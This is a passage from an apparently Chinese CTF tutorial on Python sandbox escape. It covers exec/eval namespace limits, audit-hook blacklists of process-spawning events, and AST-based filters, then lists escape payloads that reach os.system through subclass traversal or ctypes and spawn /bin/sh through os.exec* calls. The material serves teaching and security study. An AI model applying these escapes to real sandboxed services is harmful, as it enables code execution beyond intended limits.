exit(<span class="number">0</span>)</span><br><span class="line">    command = <span class="string">&#x27;result = &#x27;</span> + command</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">exec</span> command <span class="keyword">in</span> _<span class="keyword">global</span>     <span class="comment"># do calculate in a sandboxed environment</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="built_in">print</span> e</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    result = _<span class="keyword">global</span>[<span class="string">&#x27;result&#x27;</span>]  <span class="comment"># extract the result</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">banner()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    command = getexp()</span><br><span class="line">    <span class="built_in">print</span> sandbox_exec(command)</span><br></pre></td></tr></table></figure>

<h4 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h4><p><em>eval的执行与exec基本一致</em>，都可以对命名空间进行限制，例如下面的代码，在这个示例中就是直接将命名空间置空，这样就使得内置的函数都无法使用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(</span><br><span class="line">    <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;code&gt; &quot;</span>), </span><br><span class="line">         &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;, <span class="comment">#全局变量空间</span></span><br><span class="line">        &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125; <span class="comment">#局部变量空间</span></span><br><span class="line">        )</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<p><strong>代码解析</strong></p>
<p>在Python中，<code>eval()</code>函数用于执行一个字符串表达式，并返回表达式的结果。其语法为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(expression, globals=None, locals=None)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>expression</code>：要计算的字符串表达式。</li>
<li><code>globals</code>：可选参数，用于指定全局命名空间。</li>
<li><code>locals</code>：可选参数，用于指定局部命名空间。</li>
</ul>
<p><u>默认情况下</u>，<code>eval()</code>函数在当前的全局和局部命名空间中执行表达式，这意味着它可以访问内置函数和当前上下文中的所有变量和函数。然而，通过显式传递<code>globals</code>和<code>locals</code>参数，可以控制表达式执行时的命名空间。</p>
<p>在上面那串代码中，<code>eval()</code>的第二个参数和第三个参数都设置为<code>&#123;&quot;__builtins__&quot;:&#123;&#125;&#125;</code>。这两个参数分别代表全局和局部命名空间。同时为什么这样设置可以导致内置函数无法使用，原因就是这样的代码构造成了一些区别，如下：</p>
<ol>
<li><strong>清空命名空间</strong>：<ul>
<li>传递给<code>eval()</code>的全局命名空间是一个字典<code>&#123;&quot;__builtins__&quot;: &#123;&#125;&#125;</code>，这意味着<code>eval()</code>将在这个空字典中查找全局变量。</li>
<li>同样地，传递给<code>eval()</code>的局部命名空间也是一个字典<code>&#123;&quot;__builtins__&quot;: &#123;&#125;&#125;</code>，这意味着<code>eval()</code>将在这个空字典中查找局部变量。</li>
</ul>
</li>
<li><strong>无内置函数：</strong><ul>
<li>Python内置函数和异常处理器默认情况下存储在<code>__builtins__</code>模块中。如果<code>__builtins__</code>设置为空字典，所有的内置函数（如<code>print</code>, <code>len</code>, <code>int</code>等）和异常类（如<code>ValueError</code>, <code>TypeError</code>等）都将不可用</li>
</ul>
</li>
</ol>
<p><strong>总结</strong>：<u>将<code>globals</code>和<code>locals</code>都设置为<code>&#123;&quot;__builtins__&quot;: &#123;&#125;&#125;</code>，相当于将命名空间置空，剥夺了<code>eval()</code>对内置函数、全局变量和局部变量的访问权</u>。这种做法增加了执行的安全性，但同时也限制了可以执行的表达式的范围。</p>
<h5 id="eval与exec-的区别"><a href="#eval与exec-的区别" class="headerlink" title="eval与exec 的区别"></a>eval与exec 的区别</h5><p>eval与exec的区别在于<code>exec</code>允许<code>\n</code>和<code>;</code>进行换行，而eval不允许。并且exec不会将结果输出出来，而 eval 会。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;print(&#x27;RCE&#x27;); __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>) <span class="comment">#Using &quot;;&quot;</span></span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;print(&#x27;RCE&#x27;)\n__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>) <span class="comment">#Using &quot;\n&quot;</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>) <span class="comment">#Eval doesn&#x27;t allow &quot;;&quot;</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">compile</span>(<span class="string">&#x27;print(&quot;hello world&quot;); print(&quot;heyy&quot;)&#x27;</span>, <span class="string">&#x27;&lt;stdin&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)) <span class="comment">#This way eval accept &quot;;&quot;</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">compile</span>(<span class="string">&#x27;def myFunc():\n\ta=&quot;hello word&quot;\n\tprint(a)\nmyFunc()&#x27;</span>, <span class="string">&#x27;&lt;stdin&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>))</span><br><span class="line"><span class="built_in">exec</span>(<span class="built_in">compile</span>(<span class="string">&#x27;def myFunc():\n\ta=&quot;hello word&quot;\n\tprint(a)\nmyFunc()&#x27;</span>, <span class="string">&#x27;&lt;stdin&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;stdin&gt;表示代码块的来源是标准输入</span></span><br></pre></td></tr></table></figure>

<p>如果加入了 compile 函数则需要按照 compile 函数的模式进行区分。</p>
<h5 id="compile"><a href="#compile" class="headerlink" title="compile"></a>compile</h5><p><code>compile()</code>函数是一个内置函数，<strong>它可以将源码编译为代码或AST对象</strong>。编译的源码可以是普通的Python代码，也可以是AST对象。如果它是一个普通的Python代码，那么它必须是一个字符串。如果它是一个AST对象，那么它将被编译为一个代码对象。</p>
<p><code>compile()</code>函数的基本语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">compile(source, filename, mode, flags=0, dont_inherit=False, optimize=-1)</span><br></pre></td></tr></table></figure>

<ul>
<li>source：要编译的源代码。它可以是普通的 Python 代码，或者是一个 AST 对象。如果它是普通的 Python 代码，那么它必须是一个字符串。</li>
<li>filename：源代码的文件名。如果源代码没有来自文件，你可以传递一些可识别的值。</li>
<li>mode：源代码的种类。可以是 ‘exec’，’eval’ 或 ‘single’。’exec’ 用于模块、脚本或者命令行，’eval’ 用于简单的表达式，’single’ 用于单一的可执行语句。</li>
<li>flags 和 dont_inherit：这两个参数用于控制编译源代码时的标志和是否继承上下文。它们是可选的。</li>
<li>optimize：用于指定优化级别。默认值为 -1。</li>
</ul>
<p><strong>mode 参数决定了如何编译输入的源代码</strong>。具体来说，它有三个可能的值： ‘exec’，’eval’ 和 ‘single’。</p>
<ul>
<li>‘exec’： exec 方式就<strong>类似于</strong>直接使用 exec 方法，可以处理换行符，分号，import语句等，这就意味着，被编译的源代码中可以包含复杂的语句序列。</li>
<li>‘eval’： eval 方式也就<strong>类似于</strong>直接使用 eval，只能处理简单的表达式，不支持换行、分号、import 语句</li>
<li>‘single’：这个模式<strong>类似于</strong> ‘exec’，但是它只用于执行单个语句(可以在语句中添加换行符等)。</li>
</ul>
<p><strong>需要注意的是</strong>：<u>Python内置的<code>compile()</code>函数只是用来将源代码（一般是字符串或者AST对象）<strong>编译为代码或AST对象</strong></u>。 <strong><code>mode</code>参数决定了源代码应该如何被解释</strong>，<code>compile()</code>函数只负责编译源代码，但并不会执行它。真正执行编译后的代码需要使用<code>eval()</code>或<code>exec()</code>函数,比如下面的基于AST的沙箱的示例代码。</p>
<h4 id="基于audit-hook-的沙箱"><a href="#基于audit-hook-的沙箱" class="headerlink" title="基于audit hook 的沙箱"></a>基于audit hook 的沙箱</h4><p><strong>Python 3.8</strong>中引入的一个 audit hook（审计钩子）的新特性。审计钩子可以用来监控和记录Python程序在运行时的行为，特别是那些安全敏感的行为，如文件的读写、网络通信和动态代码的执行等。</p>
<p><strong><code>sys.addaudithook</code> 是Python的一个系统函数，</strong>被用于在Python程序运行过程中添加审计钩子（audit hook）</p>
<p><strong><code>sys.addaudithook(hook)</code>的参数<code>hook</code>是一个函数</strong>，它的定义形式为<code>hook(event: str,args: tuple)</code>。其中，<code>event</code>是一个描述事件名称的字符串，<code>args</code>是一个包含了该事件相关的参数的元组。</p>
<p>一旦一个审计钩子被添加，那么在解释器运行时，每当发生一个与安全相关的事件，就会调用该审计钩子函数。<code>event</code>参数会包含事件的描述，<code>args</code>参数则包含了事件的相关信息。这样，审计钩子就可以根据这些信息进行审计记录或者对某些事件进行阻止。</p>
<p><strong>注意</strong>：由于<code>sys.addaudithook()</code>主要是用于增加审计和安全性，一旦一个审计钩子被添加，它不能被移除，这是为了防止恶意代码移除审计钩子以逃避审计</p>
<p>比如，可以如下定义一个审计钩子，使得每次触发<code>open</code>事件都会打印一条消息：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">audit_hook</span>(<span class="params">event, args</span>):</span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;open&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Opening file: <span class="subst">&#123;args&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys.addaudithook(audit_hook)</span><br></pre></td></tr></table></figure>

<p>然后，如果运行 <code>open(&#39;myfile.txt&#39;)</code>，就会得到 <code>Opening file: (&#39;myfile.txt&#39;,)</code> 这样的输出。</p>
<p>在一些沙箱的题目中也会使用这种方式，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">event, _</span>):</span><br><span class="line">    BALCKED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;pty.spawn&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>, <span class="string">&#x27;os.exec&#x27;</span>, <span class="string">&#x27;os.posix_spawn&#x27;</span>,<span class="string">&#x27;os.spawn&#x27;</span>,<span class="string">&#x27;subprocess.Popen&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> event <span class="keyword">in</span> BALCKED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation banned: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(event))</span><br><span class="line">    ...</span><br><span class="line">    sys.addaudithook(my_audit_hook)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>这个沙箱对<code>&#39;pty.spawn&#39;, &#39;os.system&#39;, &#39;os.exec&#39;, &#39;os.posix_spawn&#39;,&#39;os.spawn&#39;,&#39;subprocess.Popen&#39;</code> 这些函数进行了限制，一旦调用则抛出异常.</p>
<p><strong>同样由于这个特性的存在，我们可以定义黑名单或者白名单来限制调用</strong>，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">黑名单：</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">event, _</span>):</span><br><span class="line">    BALCKED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;pty.spawn&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>, <span class="string">&#x27;os.exec&#x27;</span>, <span class="string">&#x27;os.posix_spawn&#x27;</span>,<span class="string">&#x27;os.spawn&#x27;</span>,<span class="string">&#x27;subprocess.Popen&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> event <span class="keyword">in</span> BALCKED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation banned: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(event))</span><br><span class="line">    ...</span><br><span class="line">    sys.addaudithook(my_audit_hook)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>白名单，如下沙箱值允许 input exec compile等函数的调用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">my_event, _</span>):</span><br><span class="line">    WHITED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> my_event <span class="keyword">not</span> <span class="keyword">in</span> WHITED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation not permitted: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(my_event))</span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sys.addaudithook(my_audit_hook)</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><strong>为什么要在集合前面加<code>set()</code>函数：</strong>使用 set 类型的数据结构是因为 set 在查找元素（即检查元素是否存在于集合中）时的效率是非常高的，几乎为常数时间。相较于列表或元组，set 的优势就在于当你需要频繁地查找元素时，能够让代码运行得更快。<br>再者，使用 set 还有个好处是它会自动去除任何重复的元素，这对于确保每个事件只出现一次非常有用。</p>
<p>在白名单这种情况下，一般的payload无法使用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">（<span class="number">1</span>）&gt; <span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>).CDLL(<span class="literal">None</span>).system(<span class="string">&#x27;ls /&#x27;</span>.encode())</span><br><span class="line">Operation <span class="keyword">not</span> permitted: <span class="keyword">import</span></span><br><span class="line"></span><br><span class="line">（<span class="number">2</span>）&gt; [ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">Operation <span class="keyword">not</span> permitted: os.system</span><br></pre></td></tr></table></figure>

<p>代码解析：</p>
<p><strong>对于（1）</strong>：</p>
<ul>
<li><p><code>__import__(&#39;ctypes&#39;)</code>：导入<code>ctypes</code>库，<code>ctypes</code>库是Python的一个外部函数库，可以用来调用C语言中的动态链接库</p>
</li>
<li><p><code>CDLL(None)</code>：会加载C库，在 ctypes 中，如果我们传递 <code>None</code> 给 <code>CDLL()</code>，它将会加载 C 的标准库。<strong>系统的 C 标准库中包含了很多我们常用的系统调用函数</strong>，比如文件操作、输入输出、甚至包括了 <code>system()</code> 函数。所以，<code>CDLL(None).system()</code> 实际上是调用了 C 标准库中的 <code>system()</code> 函数。</p>
</li>
<li><p><code>encode()</code>：在 Python 中，**<code>.encode()</code> 方法是用于字符串的，<u>它返回的是原字符串的字节字符串表示</u>**。在这段代码中，<code>&#39;ls /&#39;.encode()</code> 将字符串 <code>&#39;ls /&#39;</code> 转换成字节字符串。这样做的原因是 <code>ctypes.CDLL().system()</code> 函数需要的参数通常是二进制字符串（在 Python 中是 bytes 类型），而不是普通的字符串（在 Python 中是 str 类型）。</p>
<p><u>当调用python中低级别的系统函数（如C标准库中的函数）时，通常需要用字节字符串作为参数，而不是普通字符串。这是因为底层的 C 函数通常处理的是原始的字节序列，而不是 Python 的 str 对象。</u></p>
</li>
</ul>
<p><strong>对于（2）：</strong></p>
<ul>
<li><p>首先，<code>&#39;&#39;.__class__.__base__.__subclasses__()</code>这段代码获取了Python的<code>object</code>基类的所有子类，返回的是一个列表。这里，<code>&#39;&#39;</code>是一个空字符串，<code>&#39;&#39;.__class__</code>取得其类别，即<code>str</code>，<code>&#39;&#39;.__class__.__base__</code>则进一步取得其基类，即<code>object</code>。在Python中，所有类都起源于<code>object</code>。</p>
</li>
<li><p>然后，针对这个列表进行了遍历。 <code>for x in &#39;&#39;.__class__.__base__.__subclasses__()</code> <strong>这段代码通过 for 循环，把基类 <code>object</code> 的所有子类逐个赋值给变量 <code>x</code>。</strong></p>
</li>
<li><p>接着，<code>if x.__name__==&quot;_wrap_close&quot;</code>这段是一个if判断，<strong>当子类的名字为<code>_wrap_close</code>时，继续下一步。</strong></p>
</li>
<li><p><code>x.__init__.__globals__</code>取得了<code>_wrap_close</code>的初始化函数（<code>__init__</code>方法）的全局变量。因此 <code>x.__init__.__globals__ for x in &#39;&#39;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;</code> 这整段代码的作用是获取了 <code>_wrap_close</code> 初始化函数的全局变量。</p>
</li>
<li><p>然后，<code>[x.__init__.__globals__ for x in &#39;&#39;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0]</code> 中的 <code>[0]</code> 是选取初始化函数全局变量的第一个元素。</p>
</li>
<li><p>最后，<code>[&quot;system&quot;](&quot;ls&quot;)</code> 在第一个元素中查找 <code>system</code> 函数，并执行它，传入的参数是 <code>&quot;ls&quot;</code>。</p>
<p>总的来说，**这段代码的目的是通过获取Python所有类的基类的子类，并遍历寻找”_wrap_close”类（其实就是在找os模块，即<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>），获取其初始化函数的全局变量，从而找到并执行 <code>system(&quot;ls&quot;)</code>**。这样的做法可能是为了绕过直接调用可能被限制的 <code>os.system()</code>。并且执行顺序与Python语言的语法和特性有关。</p>
</li>
</ul>
<h4 id="基于AST的沙箱"><a href="#基于AST的沙箱" class="headerlink" title="基于AST的沙箱"></a>基于AST的沙箱</h4><p>Python的抽象语法树（AST，Abstract Syntax Tree）是一种用来表示Python源代码的树状结构。在这个树状结构中，每个节点都代表源代码中的一种结构，如一个函数调用、一个操作符、一个变量等。Python 的 ast 模块提供了一种机制来解析 Python 源代码并生成这样的抽象语法树。 下面是Python <code>ast</code>模块的一些常见节点类型：</p>
<ul>
<li><code>ast.Module</code>: 表示一个整个的模块或者脚本。</li>
<li><code>ast.FunctionDef</code>: 表示一个函数定义。</li>
<li><code>ast.AsyncFunctionDef</code>: 表示一个异步函数定义。</li>
<li><code>ast.ClassDef</code>: 表示一个类定义。</li>
<li><code>ast.Return</code>: 表示一个return语句。</li>
<li><code>ast.Delete</code>: 表示一个del语句。</li>
<li><code>ast.Assign</code>: 表示一个赋值语句。</li>
<li><code>ast.AugAssign</code>: 表示一个增量赋值语句，如<code>x += 1</code>。</li>
<li><code>ast.For</code>: 表示一个for循环。</li>
<li><code>ast.While</code>: 表示一个while循环。</li>
<li><code>ast.If</code>: 表示一个if语句。</li>
<li><code>ast.With</code>: 表示一个with语句。</li>
<li><code>ast.Raise</code>: 表示一个raise语句。</li>
<li><code>ast.Try</code>: 表示一个try&#x2F;except语句。</li>
<li><code>ast.Import</code>: 表示一个import语句。</li>
<li><code>ast.ImportFrom</code>: 表示一个from…import…语句。</li>
<li><code>ast.Expr</code>: 表示一个表达式。</li>
<li><code>ast.Call</code>: 表示一个函数调用。</li>
<li><code>ast.Name</code>: 表示一个变量名。</li>
<li><code>ast.Attribute</code>: 表示一个属性引用，如<code>x.y</code>。</li>
</ul>
<p>其他类型的节点可在Python官方文档的<code>ast</code>模块部分找到。</p>
<p>一些CTF题目就采用了检查AST节点构建沙箱，下面是一个示例. 在这个示例中, verify_secure 函数对 compile 之后的代码进行校验, 禁止 <code>ast.Import|ast.ImportFrom|ast.Call</code> 这三类操作, <strong>这样一来就无法导入模块和执行函数.</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_secure</span>(<span class="params">m</span>):</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> ast.walk(m):</span><br><span class="line">    <span class="keyword">match</span> <span class="built_in">type</span>(x):</span><br><span class="line">      <span class="keyword">case</span> (ast.Import|ast.ImportFrom|ast.Call):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ERROR: Banned statement <span class="subst">&#123;x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">abspath = os.path.abspath(__file__)</span><br><span class="line">dname = os.path.dirname(abspath)</span><br><span class="line">os.chdir(dname)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-- Please enter code (last line must contain only --END)&quot;</span>)</span><br><span class="line">source_code = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  line = sys.stdin.readline()</span><br><span class="line">  <span class="keyword">if</span> line.startswith(<span class="string">&quot;--END&quot;</span>):</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  source_code += line</span><br><span class="line"></span><br><span class="line">tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;input.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line"><span class="keyword">if</span> verify_secure(tree):  <span class="comment"># Safe to execute!</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;-- Executing safe code:&quot;</span>)</span><br><span class="line">  compiled = <span class="built_in">compile</span>(source_code, <span class="string">&quot;input.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">  <span class="built_in">exec</span>(compiled)</span><br></pre></td></tr></table></figure>

<h3 id="逃逸目标"><a href="#逃逸目标" class="headerlink" title="逃逸目标"></a>逃逸目标</h3><p>沙箱逃逸的目标是执行shell、读写文件或者获取环境变量信息等</p>
<h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>命令执行可以利用的方法有很多，如下：</p>
<h6 id="commands模块-仅限2-x"><a href="#commands模块-仅限2-x" class="headerlink" title="commands模块(仅限2.x)"></a>commands模块(仅限2.x)</h6><p>在python3中这个模块已经被弃用，注意python版本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"></span><br><span class="line">commands.getoutput(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br><span class="line">commands.getstatusoutput(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h6 id="timeit模块"><a href="#timeit模块" class="headerlink" title="timeit模块"></a>timeit模块</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p><code>timeit</code>模块是Python标准库中的一个用于测量小段Python代码执行时间的工具。</p>
<p><code>timeit.timeit()</code>方法接受两个主要的参数：</p>
<ul>
<li><p>第一个参数是你要度量的代码片段，写作字符串形式。</p>
</li>
<li><p><code>number</code>是一个可选的参数，它定义了你要执行的代码片段的重复次数，即你想运行这段代码多少次。默认值是1000000。</p>
</li>
</ul>
<h6 id="exec函数"><a href="#exec函数" class="headerlink" title="exec函数"></a>exec函数</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)</span><br></pre></td></tr></table></figure>



<h6 id="eval函数"><a href="#eval函数" class="headerlink" title="eval函数"></a>eval函数</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>如上eval只能执行一条简单的表达式，如果想使用执行多行代码，就需要使用<code>compile</code>函数并传入exec模式就能实现（上面讲过）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">compile</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;);print(&quot;haha&quot;)&#x27;</span>,<span class="string">&#x27;&lt;string&gt;&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p><strong>或者使用海象表达式</strong>，下面多行限制那里有说。</p>
<h6 id="platform模块"><a href="#platform模块" class="headerlink" title="platform模块"></a>platform模块</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">platform.sys.modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">或</span><br><span class="line">platform.os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h6 id="os模块"><a href="#os模块" class="headerlink" title="os模块"></a>os模块</h6><ul>
<li>os.system</li>
<li>os.popen</li>
<li>os.posix_spawn</li>
<li>os.exec*</li>
<li>os.spawnv</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">os.popen(<span class="string">&quot;ls&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">os.posix_spawn(<span class="string">&quot;/bin/ls&quot;</span>, [<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;-l&quot;</span>], os.environ)</span><br><span class="line"></span><br><span class="line">os.posix_spawn(<span class="string">&quot;/bin/bash&quot;</span>, [<span class="string">&quot;/bin/bash&quot;</span>], os.environ)</span><br><span class="line"></span><br><span class="line">os.spawnv(<span class="number">0</span>,<span class="string">&quot;/bin/ls&quot;</span>, [<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;-l&quot;</span>])</span><br></pre></td></tr></table></figure>

<p><em><em>os.exec</em>()</em>*</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execl</span></span><br><span class="line">os.execl(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execl(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execle</span></span><br><span class="line">os.execle(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>, os.environ)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execle(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>, <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).environ)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execlp</span></span><br><span class="line">os.execlp(<span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execle(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>, <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).environ)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execlpe</span></span><br><span class="line">os.execlpe(<span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>, os.environ)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execlpe(<span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>, <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).environ)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execv</span></span><br><span class="line">os.execv(<span class="string">&#x27;/bin/sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>])</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execv(<span class="string">&#x27;/bin/sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execve</span></span><br><span class="line">os.execve(<span class="string">&#x27;/bin/sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>], os.environ)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execve(<span class="string">&#x27;/bin/sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>], <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).environ)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execvp</span></span><br><span class="line">os.execvp(<span class="string">&#x27;sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>])</span><br><span class="line"><span 